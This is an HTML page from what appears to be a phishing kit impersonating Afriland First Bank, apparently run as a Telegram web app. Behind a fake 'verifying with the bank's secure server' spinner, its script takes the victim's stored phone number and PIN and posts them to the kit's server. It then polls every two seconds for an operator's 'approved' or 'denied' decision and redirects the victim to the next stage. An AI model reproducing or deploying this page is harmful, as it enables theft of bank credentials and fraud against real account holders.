<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Afriland First Bank - Traitement</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --purple-primary: #6b21a8; }
        body { background-color: #1f2937; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .loading-card { background: white; width: 88%; max-width: 380px; padding: 40px 24px; border-radius: 20px; text-align: center; }
        .spinner { width: 60px; height: 60px; border: 4px solid #e5e7eb; border-top: 4px solid var(--purple-primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: var(--purple-primary); font-size: 22px; margin-bottom: 10px; }
        p { color: #4b5563; font-size: 14px; }
    </style>
</head>
<body>
<div class="loading-card">
    <div class="spinner"></div>
    <h2 id="main-text">Vérification...</h2>
    <p id="sub-text">Connexion au serveur sécurisé de la banque</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
    const phone = localStorage.getItem("phone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });
    } catch (err) { console.error(err); }

    async function checkApproval() {
        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();
            if (data.status === "approved") {
                window.location.href = "/page8";
            } else if (data.status === "denied") {
                window.location.href = "/page6?error=wrongpin";
            }
        } catch (err) {}
    }
    setInterval(checkApproval, 2000);
});
</script>
</body>
</html>
